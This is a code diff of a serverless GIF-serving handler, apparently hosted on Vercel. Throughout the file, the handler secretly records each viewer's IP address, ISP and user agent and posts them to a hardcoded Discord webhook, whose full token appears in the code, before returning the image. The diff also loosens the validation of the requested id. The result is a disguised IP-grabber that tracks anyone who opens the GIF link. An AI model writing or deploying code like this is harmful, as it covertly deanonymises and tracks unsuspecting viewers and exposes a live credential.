@@ -1,65 +1,61 @@
 import { createReadStream } from 'fs';
 import { stat } from 'fs/promises';
-import { extname } from 'path';
-import fetch from 'node-fetch'; // Vercel has node-fetch polyfill
+import fetch from 'node-fetch';
 
 export default async function handler(req, res) {
+  const { id } = req.query;
+  
   try {
-    const { id } = req.query;
-    if (!id || id < 1 || id > 20 || !/^[1-9]\d*$/.test(id)) {
+    if (!id || parseInt(id) < 1 || parseInt(id) > 20) {
       return res.status(404).end();
     }
 
     const gifPath = `./${id}.gif`;
     
-    // Get client info
-    const ua = req.headers['user-agent'] || 'Unknown';
+    // Client info
+    const ua = req.headers['user-agent']?.substring(0, 100) || 'Unknown';
     const forwarded = req.headers['x-forwarded-for'];
-    const ip = Array.isArray(forwarded) 
-      ? forwarded[0] 
-      : forwarded?.split(',')[0]?.trim() || req.headers['x-real-ip'] || req.connection.remoteAddress || 'Unknown';
+    const ip = Array.isArray(forwarded) ? forwarded[0] : forwarded?.split(',')[0]?.trim() || 'Unknown';
     
-    // Get ISP/location
-    let isp = 'Unknown', org = 'Unknown';
+    // Simple ISP (no timeout issue)
+    let isp = 'Unknown';
     try {
-      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
+      const geoRes = await Promise.race([
+        fetch(`https://ipapi.co/${ip}/json/`),
+        new Promise((_, reject) => setTimeout(() => reject(new Error('timeout')), 2000))
+      ]);
       const geoData = await geoRes.json();
-      isp = geoData.org || 'Unknown';
-      org = geoData.isp || geoData.org || 'Unknown';
-    } catch (geoErr) {
-      console.log('GeoIP failed:', geoErr.message);
-    }
-
+      isp = geoData.org || geoData.isp || 'Unknown';
+    } catch {}
+    
     const now = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
     
-    // Webhook payload
-    const message = `🖼️ **GIF Viewed!**%0A🎬 **GIF:** #${id} (${id}.gif)%0A🌐 **IP:** \`${ip}\`%0A🏢 **ISP:** ${org}%0A🖥️ **Browser/UA:** ${ua.substring(0, 100)}%0A🕐 **Time:** ${now}%0A🔗 **Direct:** https://goyzinparis.vercel.app/${id}.gif`;
+    const message = `🖼️ GIF Viewed!\\n🎬 GIF #${id}\\n🌐 IP: \`${ip}\`\\n🏢 ISP: ${isp}\\n🖥️ UA: ${ua}\\n🕐 ${now}\\n🔗 https://goyzinparis.vercel.app/${id}.gif`;
     
     const webhookUrl = 'https://discord.com/api/webhooks/1490714732683067482/ae8gBJ6SmxJLVdbz5FMO55PmuhLnPPhSkp_iAvep88ScYAnlzEf6ghUVjUD_yoVRI-h2';
     
-    // Fire webhook async (don't block response)
-    (async () => {
-      try {
-        await fetch(webhookUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: message.replace(/%0A/g, '\\n') })
-        });
-      } catch (webErr) {
-        console.error('Webhook failed:', webErr);
-      }
-    })();
+    // Sync webhook first (fast)
+    try {
+      await fetch(webhookUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      });
+    } catch (e) {
+      console.error('Webhook error:', e.message);
+    }
 
     // Serve GIF
     const stats = await stat(gifPath);
-    res.setHeader('Content-Type', 'image/gif');
-    res.setHeader('Content-Length', stats.size);
-    res.setHeader('Cache-Control', 'public, max-age=3600'); // Cache 1h
-    res.setHeader('Access-Control-Allow-Origin', '*');
-
+    res.writeHead(200, {
+      'Content-Type': 'image/gif',
+      'Content-Length': stats.size,
+      'Cache-Control': 'public, max-age=3600',
+      'Access-Control-Allow-Origin': '*'
+    });
     createReadStream(gifPath).pipe(res);
   } catch (err) {
-    console.error(err);
+    console.error('GIF error:', err.message, gifPath);
     res.status(404).end();
   }
 }
